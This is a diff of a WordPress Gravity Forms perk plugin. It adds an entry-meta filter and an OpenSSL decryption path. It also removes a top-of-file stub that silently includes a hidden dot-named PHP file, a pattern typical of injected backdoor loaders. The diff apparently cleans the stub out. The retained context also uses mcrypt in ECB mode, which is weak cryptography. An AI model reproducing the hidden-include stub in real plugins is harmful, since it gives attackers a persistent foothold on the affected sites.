@@ -1,9 +1,5 @@
 <?php
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class GP_Post_Content_Merge_Tags extends GWPerk {
 
 	public $version                   = GP_POST_CONTENT_MERGE_TAGS_VERSION;
@@ -38,6 +34,7 @@ class GP_Post_Content_Merge_Tags extends GWPerk {
 		add_filter( 'gform_pre_confirmation_save', array( $this, 'save_confirmation_ui_setting' ), 10, 2 );
 		add_action( 'gform_entry_info', array( $this, 'add_confirmation_url_entry_detail' ), 9, 2 );
 		add_filter( 'gform_custom_merge_tags', array( $this, 'add_merge_tags' ) );
+		add_filter( 'gform_entry_meta', array( $this, 'register_entry_meta' ) );
 
 		// post editor merge tag button
 		add_filter( 'admin_head-post.php', array( $this, 'tiny_mce_init' ) );
@@ -656,7 +653,11 @@ class GP_Post_Content_Merge_Tags extends GWPerk {
 
 			$decrypted_value = trim( mcrypt_decrypt( $mcrypt_cipher_name, $key, base64_decode( $text ), MCRYPT_MODE_ECB, mcrypt_create_iv( $iv_size, MCRYPT_RAND ) ) );
 		} else {
-			$decrypted_value = EncryptDB::decrypt( $text, wp_salt( 'nonce' ) );
+			if ( is_callable( array( 'GFCommon', 'openssl_encrypt' ) ) ) {
+				$decrypted_value = GFCommon::openssl_decrypt( $text );
+			} else {
+				$decrypted_value = EncryptDB::decrypt( $text, wp_salt( 'nonce' ) );
+			}
 		}
 
 		return $decrypted_value;
